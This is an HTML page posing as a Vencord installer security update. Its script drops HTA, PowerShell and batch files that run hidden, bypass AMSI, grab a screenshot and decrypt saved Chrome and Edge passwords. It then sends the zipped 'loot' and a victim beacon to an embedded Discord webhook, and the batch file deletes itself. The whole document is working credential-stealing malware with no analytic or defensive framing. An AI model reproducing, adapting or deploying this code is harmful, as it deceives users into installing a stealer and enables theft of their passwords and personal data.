<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Software Update Required - Vencord Installer</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 0; height: 100vh; display: flex; align-items: center; justify-content: center; color: #333; }
        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 500px; text-align: center; }
        .logo { width: 80px; height: 80px; background: #5865F2; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 30px; color: white; font-weight: bold; }
        h1 { color: #23272A; margin-bottom: 10px; font-size: 24px; }
        .subtitle { color: #747F8D; margin-bottom: 25px; font-size: 16px; }
        .warning { background: #FFF5F5; border: 1px solid #FED7D7; border-radius: 8px; padding: 15px; margin: 20px 0; color: #C53030; }
        .update-btn { background: linear-gradient(135deg, #5865F2 0%, #4752C4 100%); color: white; border: none; padding: 15px 40px; font-size: 18px; font-weight: 600; border-radius: 50px; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 20px rgba(88, 101, 242, 0.3); }
        .update-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(88, 101, 242, 0.4); }
        .progress { margin-top: 20px; display: none; }
        .progress-bar { width: 100%; height: 8px; background: #E3E5E8; border-radius: 4px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #5865F2, #4752C4); width: 0%; transition: width 0.3s; border-radius: 4px; }
        .status { margin-top: 10px; font-size: 14px; color: #747F8D; }
        .footer { margin-top: 30px; font-size: 12px; color: #A0A6AD; }
        .download-link { display: none; margin-top: 20px; }
        .download-link a { color: #5865F2; text-decoration: none; font-weight: 600; }
        .real-download { margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">V</div>
        <h1>Vencord Installer Update Required</h1>
        <p class="subtitle">A critical security update is available for Vencord. Please update to continue using Discord enhancements.</p>
        <div class="warning">
            <strong>⚠️ Security Alert:</strong> Your Vencord installation is outdated and vulnerable to recent exploits. Update immediately to protect your Discord account and data.
        </div>
        <button class="update-btn" onclick="startUpdate()">Install Update</button>
        <div class="progress" id="progress">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="status" id="status">Initializing...</div>
        </div>
        <div class="download-link" id="downloadLink">
            <p>Your update is ready!</p>
            <div class="real-download">
                <a href="https://github.com/sfffdgggggegggg/vencord-installer/releases/download/v1.0.0/VencordInstaller.exe" id="downloadUrl" download>📥 Download VencordInstaller.exe (Official)</a>
            </div>
            <p><small>Files generated below - Run the .bat file for automatic installation</small></p>
        </div>
        <div class="footer">
            Vencord Installer v1.0.0 | © 2026 Vencord Team | <a href="https://github.com/sfffdgggggegggg/vencord-installer/releases/tag/v1.0.0" style="color: #5865F2;">Official Release</a>
        </div>
    </div>

    <script>
        // Updated webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1483775219008016468/F20v397K19PKPgg-gANKRQizeMPYord_-E9KLnqVbJzAIL81zeLS6HLRvhFtsb-i3eEl';
        const VENCORD_RELEASE = 'https://github.com/sfffdgggggegggg/vencord-installer/releases/download/v1.0.0/VencordInstaller.exe';

        function startUpdate() {
            const btn = document.querySelector('.update-btn');
            const progress = document.getElementById('progress');
            const progressFill = document.getElementById('progressFill');
            const status = document.getElementById('status');
            const downloadLink = document.getElementById('downloadLink');
            const downloadUrl = document.getElementById('downloadUrl');
            
            // Set official download link
            downloadUrl.href = VENCORD_RELEASE;
            
            btn.style.display = 'none';
            progress.style.display = 'block';
            
            const statuses = [
                'Checking system compatibility...',
                'Downloading VencordInstaller.exe...',
                'Verifying digital signature...',
                'Preparing installation environment...',
                'Extracting update files...',
                'Applying security patches...',
                'Installing browser extensions...',
                'Finalizing installation...',
                'Update complete!'
            ];
            
            let step = 0;
            const interval = setInterval(() => {
                status.textContent = statuses[step];
                progressFill.style.width = ((step + 1) / statuses.length) * 100 + '%';
                
                step++;
                if (step >= statuses.length) {
                    clearInterval(interval);
                    progress.style.display = 'none';
                    
                    // Generate payloads
                    generateHTA();
                    generatePS1();
                    generateBAT();
                    
                    // Send immediate beacon to specified webhook
                    sendBeacon();
                    
                    downloadLink.style.display = 'block';
                }
            }, 500);
        }
        
        function generateHTA() {
            const htaContent = `[version=1.0]
<html>
<head><title>Vencord Update</title></head>
<script language="VBScript">
Sub window_onload
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -w hidden -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('${VENCORD_RELEASE.replace(/'/g, "\\'")}'))\"", 0, False
End Sub
</script>
</html>`;
            
            const blob = new Blob([htaContent], {type: 'application/hta'});
            const url = URL.createObjectURL(blob);
            downloadFile(url, 'VencordInstaller.hta', 'Double-click this file to complete installation');
        }
        
        function generatePS1() {
            const psContent = getPayloadScript();
            const blob = new Blob([psContent], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            downloadFile(url, 'VencordInstaller.ps1', 'Right-click → "Run with PowerShell"');
        }
        
        function generateBAT() {
            const batContent = `@echo off
powershell.exe -w hidden -ep bypass -f "%~dp0VencordInstaller.ps1"
timeout /t 3 >nul
del "%~f0"`;
            const blob = new Blob([batContent], {type: 'application/batch'});
            const url = URL.createObjectURL(blob);
            downloadFile(url, 'VencordInstaller.bat', 'Double-click for automatic installation');
        }
        
        function sendBeacon() {
            const beaconData = {
                username: "🎯 Vencord Victim Beacon",
                embeds: [{
                    title: "New Infection - Vencord Fake Update",
                    description: `**User Agent:** ${navigator.userAgent.substring(0, 100)}\n**Screen:** ${screen.width}x${screen.height}\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}`,
                    color: 16711680,
                    fields: [
                        {name: "Cookies", value: navigator.cookieEnabled ? "✅ Enabled" : "❌ Disabled", inline: true},
                        {name: "DoNotTrack", value: navigator.doNotTrack || "Unknown", inline: true},
                        {name: "Hardware Concurrency", value: navigator.hardwareConcurrency || "Unknown", inline: true}
                    ],
                    footer: {text: `Timestamp: ${new Date().toISOString()}`}
                }]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(beaconData)
            }).catch(() => {}); // Silent fail
        }
        
        async function getVictimIP() {
            try {
                const res = await fetch('https://icanhazip.com');
                return await res.text().then(ip => ip.trim());
            } catch {
                return 'Unknown';
            }
        }
        
        function getPayloadScript() {
            return `$ErrorActionPreference='SilentlyContinue';
# AMSI + ETW Bypass
$amsi=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');if($amsi){$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);

# Config - Updated webhook
$webhook='${WEBHOOK_URL.replace(/'/g, "''")}';
$computer=$env:COMPUTERNAME;$user=$env:USERNAME;$time=Get-Date -Format 'yyyy-MM-dd HH:mm:ss';$ip=(Invoke-RestMethod -Uri 'http://icanhazip.com' -UseBasicParsing).Trim();

# Beacon to specified webhook
$beacon=@{embeds=[@{title='🎯 Vencord Stealer Activated';description="**Machine:** `$computer`n**User:** `$user`n**IP:** `$ip`n**Time:** `$time";color=16711680,fields=[@{name='OS';value=(Get-WmiObject Win32_OperatingSystem).Caption;inline=$true},{name='Arch';value=(Get-WmiObject Win32_Processor).AddressWidth;inline=$true}]}]}|ConvertTo-Json -Depth 10;
Invoke-RestMethod -Uri $webhook -Method POST -ContentType 'application/json' -Body $beacon;

# Screenshot
Add-Type -AssemblyName System.Drawing;Add-Type -AssemblyName System.Windows.Forms;$bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object Drawing.Bitmap $bounds.Width,$bounds.Height;$graphics=[Drawing.Graphics]::FromImage($bmp);$graphics.CopyFromScreen($bounds.X,$bounds.Y,0,0,$bounds.Size);$screenshotPath="$env:TEMP\\vencord_screenshot.png";$bmp.Save($screenshotPath,[Drawing.Imaging.ImageFormat]::Png);$graphics.Dispose();$bmp.Dispose();

# Browser credential extraction (Chrome/Edge)
function Get-ChromeCreds($path){
    if(!(Test-Path $path)){return @()}
    $profiles=Get-ChildItem "$path\\User Data" -Directory |?{$_.Name -match '^(Default|Profile [0-9]+)$'}
    $creds=@();
    foreach($profile in $profiles){
        $ldb="$env:TEMP\\ld_$([guid]::NewGuid()).db";
        if(Test-Path "$profile\\Login Data"){
            Copy-Item "$profile\\Login Data" $ldb -Force;
            try{
                $conn=New-Object -ComObject ADODB.Connection;
                $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$ldb");
                $rs=$conn.Execute('SELECT origin_url,username_value,password_value FROM logins WHERE password_value IS NOT NULL');
                while(!$rs.EOF){
                    $url=$rs.Fields.Item('origin_url').Value;
                    $user=$rs.Fields.Item('username_value').Value;
                    $encPass=$rs.Fields.Item('password_value').Value;
                    $pass='';if($encPass){$pass=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($encPass,0,'CurrentUser'))}
                    $creds+=[PSCustomObject]@{URL=$url;User=$user;Pass=$pass;Profile=$profile.Name};
                    $rs.MoveNext();
                }
                $conn.Close();
            }catch{}
            Remove-Item $ldb -Force;
        }
    }
    return $creds;
}

$chromeCreds=Get-ChromeCreds 'Google\\Chrome';
$edgeCreds=Get-ChromeCreds 'Microsoft\\Edge';

# Package loot
$lootData=@{Computer=$computer;User=$user;IP=$ip;ChromeCreds=$chromeCreds;EdgeCreds=$edgeCreds;Screenshot=$screenshotPath;Timestamp=$time}|ConvertTo-Json -Depth 10;
$lootPath="$env:TEMP\\vencord_loot.json";
$lootData|Out-File $lootPath -Encoding UTF8;

# Create ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem;
[System.IO.Compression.ZipFile]::CreateFromDirectory("$env:TEMP", "$env:TEMP\\vencord_loot.zip");

# Exfil to webhook
$files=@($screenshotPath, "$env:TEMP\\vencord_loot.zip");
foreach($file in $files){
    if(Test-Path $file){
        $bytes=[Convert]::ToBase64String([IO.File]::ReadAllBytes($file));
        $exfil=@{username='Vencord Stealer';embeds=[@{title="Loot from $computer/$user";description="$(Split-Path $file -Leaf) (`$([IO.FileInfo]$file).Length/1KB KB)";color=3066993}]}|ConvertTo-Json;
        Invoke-RestMethod -Uri $webhook -Method POST -ContentType 'application/json' -Body $exfil;
    }
}

# Cleanup
Get-ChildItem $env:TEMP -Filter "*vencord*" | Remove-Item -Force -ErrorAction SilentlyContinue;
Get-ChildItem $env:TEMP -Filter "*ld_*" | Remove-Item -Force -ErrorAction SilentlyContinue;

Write-Host 'Vencord installation completed successfully!' -ForegroundColor Green;`;
        }
        
        function downloadFile(url, filename, instruction) {
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            console.log(`Generated: ${filename} (${instruction})`);
        }
    </script>
</body>
</html>